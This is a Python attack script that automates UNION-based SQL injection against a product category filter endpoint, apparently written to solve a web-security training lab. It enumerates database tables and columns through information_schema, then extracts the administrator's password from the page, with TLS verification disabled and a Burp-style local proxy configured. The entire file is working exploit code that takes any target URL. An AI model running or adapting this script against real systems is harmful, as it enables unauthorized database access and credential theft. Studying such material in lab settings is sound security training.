import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http://127.0.0.1:8080','https':'https://127.0.0.1:8080'}


def make_request(url, payload):
	path = '/filter?category=Accessories'
	r = requests.get(url + path + payload, verify=False)
	return r.text


def sqli_users_table(url):
	payload = "' UNION SELECT table_name, NULL FROM information_schema.tables--"
	response = make_request(url, payload)
	soup = BeautifulSoup(response, 'html.parser')
	users_table = soup.find(text=re.compile('.*users.*'))
	if users_table:
		return users_table
	else:
		return False

def sqli_columns(url, users_table):
	payload = f"' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = '{users_table}'--"
	response = make_request(url, payload)
	soup = BeautifulSoup(response, 'html.parser')
	username_column = soup.find(text=re.compile('.*username.*'))
	password_column = soup.find(text=re.compile('.*password.*'))

	if username_column and password_column:
		return username_column, password_column

	else:
		return False

def sqli_admin_password(url, users_table, username_column, password_column):
	payload = f"' UNION SELECT {username_column}, {password_column} from {users_table}--"
	response = make_request(url, payload)
	soup = BeautifulSoup(response, 'html.parser')
	admin_password = soup.body.find(text='administrator').parent.findNext('td').contents[0]
	#administrator text is parent (<th> tag) and next in the tag is the password with (<td> tag)
	return admin_password




if __name__ == '__main__':
	try:
		url = sys.argv[1].strip()
	except IndexError:
		print(f"Usage: {sys.argv[0]} <url>")
		print(f"Example: {sys.argv[0]} www.example.com")
		sys.exit(-1)

	print('Looking for users table.............')
	users_table = sqli_users_table(url)

	if users_table:
		print(f"found the users table: {users_table}")
		username_column, password_column = sqli_columns(url, users_table)

		if username_column and password_column:
			print(f"found username and password table {username_column}, {password_column}")

			# getting the admin password.
			admin_password = sqli_admin_password(url, users_table, username_column, password_column)
			if admin_password:
				print(f"Admin password: {admin_password}")
			else:
				print("No admin  found")
		else:
			print(f"did not find username column or password")

	else:
		print("No users table found!")
		